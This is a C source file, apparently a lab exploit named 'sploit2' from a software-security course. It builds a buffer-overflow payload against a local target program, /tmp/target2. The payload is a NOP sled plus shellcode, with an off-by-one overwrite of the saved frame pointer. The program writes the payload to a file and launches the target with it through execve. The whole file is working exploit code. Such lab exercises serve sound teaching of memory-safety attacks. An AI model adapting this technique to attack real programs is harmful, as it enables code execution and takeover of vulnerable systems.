#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define OVER_SIZE (0x4A)
#define PAYLOAD_SIZE (200+1+1+OVER_SIZE)
#define NOP 0x90 // https://www.felixcloutier.com/x86/nop

int main(void)
{
	unsigned char base_pointer_smasher = 0xf4; // leave will increase the stack pointer. The payload is at 0xbffffdf8
	printf("Using %p as first byte of base pointer smasher\n", base_pointer_smasher);
	char *payload = malloc(PAYLOAD_SIZE);
	memset(payload, NOP, PAYLOAD_SIZE); // fill the payload with nop
	payload[200] = base_pointer_smasher; // put the base pointer smasher at the top
	memcpy(payload + 200 - sizeof(shellcode) - 2, shellcode, sizeof(shellcode) - 1); // -1 to do not copy the null terminator
	payload[PAYLOAD_SIZE - 1] = '\0';
	// Put the payload in a file for debug
	FILE* payload_file = fopen("sploit2-payload.bin", "wb");
	fwrite(payload, 1, PAYLOAD_SIZE, payload_file);
	fclose(payload_file);
	// Run the program
	char *args[] = { TARGET, payload, NULL };
	char *env[] = { NULL };

	execve(TARGET, args, env);
	fprintf(stderr, "execve failed.\n");

	return 0;
}
